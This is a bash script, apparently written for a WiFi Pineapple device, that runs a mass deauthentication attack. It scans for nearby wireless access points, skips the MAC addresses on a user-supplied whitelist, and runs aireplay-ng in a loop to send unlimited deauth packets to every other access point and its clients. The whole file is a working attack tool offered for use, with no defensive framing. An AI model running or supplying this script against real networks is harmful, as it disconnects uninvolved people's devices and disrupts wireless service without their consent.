#!/bin/bash
#
# Leg3nd's Mass DeAuth Script
# Designed for use with pineapple

# - If you INCREASE waitTime, You should Increase deauths.
# - If you DECREASE waitTime, You should decrease deauths.
# - Have to find the correct balence for your situation, how much your moving, how many APs and clients.
#


# Make sure we have the args
if [ ! "$1" ] || [ ! "$2" ]; then
  echo "[!] ERROR: You forgot some arguements..."
  echo "[-] Arg 1: Attack Inteface (wlan0)"
  echo "[-] Arg 2: Mac Whitelist (00:11:22:33:44:55 00:11:22:33:44:55)"
  exit 1
fi

# Vars
waitTime="90000" #Time to wait before refresh scan data.
deauths="0" #Number of deauths to Send, 0 = Infinate

################################################# CODE - DONT TOUCH
interface="$1"  # wifi cards interface
whitelist="$2" # whitelisted AP Macs
version="1.4"
atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for attack..."

trap 'cleanup' 2 # Interrupt - "Ctrl + C"
function cleanup() {
  break
  xterm -geometry 75x12+464+288 -bg black -fg green -T "Mass DeAuth v${version} - Killing deauths.." -e "killall -9 aireplay-ng"
  exit 0
}

# Cleanup
if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

# Start monitor interface
moncheck=`ifconfig | grep mon0`
if [ ! "$moncheck" ]; then airmon-ng start $interface ; fi

scan1="0"

# Main Loop
while true ; do

  curLine="1"
  x="1"
  
  # Delay
  echo -e "\e[01;32m[>]\e[00m Press [ CTRL+C ]  in this Window to Kill Attack..."
  if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
  if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 

  # Cleanup
  if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
  if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
  if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
  
  # Scan for APs
  iwlist $interface scan > /tmp/scan.tmp
  
  touch /tmp/APmacs.lst
  # Filter the mac addresses based on the whitelis
  for y in `cat /tmp/scan.tmp | grep "Address:" | cut -b 30-60`; do
  
    # Grab the Mac addresses that are not in the whitelist
    if [ ! "$(echo $whitelist | grep $y)" ]; then 
      # Get MAC
      echo "$y" >> /tmp/APmacs.lst
      # Get Channels
      cat /tmp/scan.tmp | grep "$y" -A1 | tail -n 1 | awk -F\: '{print $2}' >> /tmp/APchannels.lst
    fi
 
  done
  
  # Get Channels
#   cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
  
  # Reset vars
  lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
  curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
  curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

  echo -e "\e[01;32m[>]\e[00m DeAuthorizing $lineNum APs from scan data..."
  
  # Run deauthentication attack
  for (( b=1; b<=$lineNum; b++ ))
  do
    scan1="1"
    curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
    echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
    xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth v${version}" -e "aireplay-ng -0 $deauths --ignore-negative-one -D -a $curAP mon0" &
    curLine=$(($curLine+$x))
  done
  
  atk="1"

  done

  
  